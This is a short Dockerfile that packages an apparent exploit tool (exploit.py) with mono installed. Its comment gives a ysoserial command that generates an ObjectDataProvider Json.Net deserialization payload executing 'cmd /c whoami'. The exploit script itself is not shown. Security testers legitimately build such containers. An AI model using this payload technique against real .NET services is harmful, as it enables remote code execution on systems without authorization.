FROM python:3.12-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    mono-complete \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /exploit

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY exploit.py .

# Drop ysoserial.exe here to generate payloads manually:
#   mono /exploit/ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"
# The exploit.py generates the ObjectDataProvider JSON natively without ysoserial.

ENTRYPOINT ["python3", "exploit.py"]
